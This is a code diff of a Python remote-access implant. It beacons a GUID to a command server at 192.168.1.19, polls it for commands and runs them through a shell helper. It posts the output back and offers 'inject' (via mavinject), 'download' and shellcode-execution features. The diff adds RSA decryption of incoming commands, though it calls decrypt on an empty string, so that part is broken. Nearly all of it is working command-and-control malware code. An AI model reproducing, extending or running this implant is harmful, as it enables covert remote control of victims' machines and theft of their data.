@@ -1,12 +1,15 @@
-from subprocess import PIPE
-from ctypes import CDLL, c_char_p, c_void_p, memmove, cast, CFUNCTYPE
 import subprocess
+from ctypes import CDLL, c_char_p, c_void_p, memmove, cast, CFUNCTYPE
 import uuid
 import psutil
 import requests
 import time
-import base64
+from cryptography.hazmat.backends import default_backend
+from cryptography.hazmat.primitives import serialization
+from cryptography.hazmat.primitives import hashes
+from cryptography.hazmat.primitives.asymmetric import padding
 
+public_key = ""
 
 def sc(scode):
     '''
@@ -73,18 +76,25 @@ GUID = uuid.uuid4()
 
 headers = {
     'User-Agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36 ',
-    'APPSESSIONID':f'{GUID}',
+    'APPSESSIONID': f'{GUID}',
 }
 
 # Send our HELLO/GUID
 requests.get(f'http://192.168.1.19:8080/', headers=headers)
- 
+
 # Below is the cert requirements for mTLS when using requests
 # , cert=('client.crt', 'client.key'), verify='ca.crt'
 time.sleep(60)
 while 1:
     a = requests.get(f'http://192.168.1.19/{GUID}.html', headers=headers)
-    cmd = a.text
+    cmd = public_key.decrypt(
+        a.text,
+        padding.OAEP(
+            mgf=padding.MGF1(algorithm=hashes.SHA256()),
+            algorithm=hashes.SHA256(),
+            label=None
+        )
+    )
     print('got command')
     print(cmd)
     op = cmd.split(';')[0]
@@ -94,7 +104,7 @@ while 1:
     if op == 'cmd':
         returned = bleh(cm)
         response = requests.post('http://192.168.1.19:8080/returned', data=returned, headers=headers)
-    if op == 'inject': # We can use mavinject from cmd prompt
+    if op == 'inject':  # We can use mavinject from cmd prompt
         returned = bleh(cm)
         response = requests.post('http://192.168.1.19:8080/returned', data=returned, headers=headers)
     if op == 'download':
